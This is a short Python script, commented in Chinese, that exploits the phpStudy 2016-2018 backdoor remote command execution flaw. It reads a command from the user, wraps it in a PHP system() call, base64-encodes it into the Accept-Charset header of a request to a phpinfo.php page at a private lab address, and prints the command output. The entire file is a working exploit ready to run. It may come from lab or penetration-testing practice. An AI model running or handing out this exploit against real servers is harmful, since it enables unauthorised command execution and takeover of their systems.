# 利用phpstudy2016-2018的RCE漏洞

import base64
import requests

url = "http://192.168.109.100/phpinfo.php"

cmd = input("输入想要执行的命令：")
cmd = f"""system("{cmd}");"""
cmd = base64.b64encode(cmd.encode()).decode()


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
    "Accept-Encoding": "gzip,deflate",
    "Accept-Charset": cmd
}

res =requests.get(url=url,headers=headers)

# 做一个切片来只显示想要的结果
html=res.content.decode('GBK')
html = html[0:html.find("<!DOCTYPE html")]
print(html)